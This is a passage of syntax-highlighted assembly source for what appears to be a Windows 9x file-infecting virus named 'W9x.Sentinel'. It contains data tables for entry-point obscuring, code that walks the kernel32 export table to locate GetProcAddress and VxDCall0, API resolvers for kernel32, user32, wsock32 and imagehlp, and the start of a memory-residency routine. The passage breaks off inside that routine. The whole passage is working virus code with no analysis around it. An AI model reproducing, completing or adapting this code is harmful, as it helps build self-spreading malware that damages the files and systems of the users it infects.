    </span><span class="sc5">ASetFileTime</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ALoadLibrary</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetSystemDirectory</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetWindowsDirectory</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetFileSize</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetCurrentDirectory</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AVxdcall0A</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACheckSumMappedFile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CheckSumMappedFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">filenamebuffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        
    </span><span class="sc5">maphandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mapaddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc10">memory</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagebase</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagesize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">filealign</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sectionalign</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">filehandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">filesize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">PEheader</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ip_original</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OriginalHost</span><span class="sc0"> 

    </span><span class="sc5">windowtitle</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"W9x.Sentinel"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">msgtxt</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Observing the world f0revir"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">myseh</span><span class="sc0">               </span><span class="sc5">SEH</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">myfinddata</span><span class="sc0">          </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
    </span><span class="sc5">rva2raw</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">debug</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">

    </span><span class="sc5">epo_newip</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">epo_cs_rva</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">epo_cs_pa</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">epo_ipnew_va</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">epo_ipnew_rva</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">epo_opcode</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">15ffh</span><span class="sc0">
    </span><span class="sc5">epo_aoc_pa</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">epo_awaa_va</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_original</span><span class="sc0"> 

        </span><span class="sc5">string</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ZZZZZZZZ"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ascvalues</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"0123456789ABCDEF"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FIND_GETPROCADDRESS_API_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    
    </span><span class="sc5">LoadExportTableData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get exporttable</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; address from</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; kernel's PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        
        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">numberofnames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save number of names</span><span class="sc0">
        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointers to funtion</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; addresses</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointers to names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofnames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; of functions</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; pointers to ordinals</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofordinals</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; of functions</span><span class="sc0">

    </span><span class="sc5">BeginProcAddressSearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofnames</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; search for GetProc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; Address API in names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddress</span><span class="sc4">]</span><span class="sc0">        

    </span><span class="sc5">TryAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    

    </span><span class="sc5">MatchByte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextOne</span><span class="sc0">                 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; did the entire string</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GotIt</span><span class="sc0">                    </span><span class="sc1">; match ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MatchByte</span><span class="sc0">

    </span><span class="sc5">NextOne</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; get next namepointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; in table (4 dwords)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; align with kernelbase</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TryAgain</span><span class="sc0">

    </span><span class="sc5">GotIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofordinals</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ordinal = nameindex *</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; size of ordinal entry</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; + ordinal table base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">              
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">; address of function =</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ordinal * size of</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; entry of address </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; table + base of </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; addresstable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">; save GPA address</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
  
</span><span class="sc5">FIND_GETPROCADDRESS_API_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FIND_VXDCALL0_ADDRESS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">FindStartOfKernelExportSection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; virtual address of kernel32</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; export section</span><span class="sc0">

    </span><span class="sc5">GetVXDCallAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get ra of table with </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; pointers to funtion addresses</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AVxdcall0A</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FIND_VXDCALL0_ADDRESS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GETAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; load kernelbase</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and get api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; call the api</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; return</span><span class="sc0">
     
</span><span class="sc5">GETAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GETUAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32address</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; load user32base</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and get api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GETUAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GETWAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock32address</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load wsockbase</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; and get api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GETWAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GETIAPI</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagehlpaddress</span><span class="sc4">]</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGetProcAddressA</span><span class="sc4">]</span><span class="sc0">       
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GETIAPI</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GO_RESIDENT</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">CheckResidency</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'er0f'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">MemoryError</span><span class="sc0">                  </span><span class="sc1">; already resident</span><span class="sc0">

    </span><span class="sc5">PageReserve</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00020000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">00040000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">page_mem_size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80060000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010000h</span><span class="sc0">
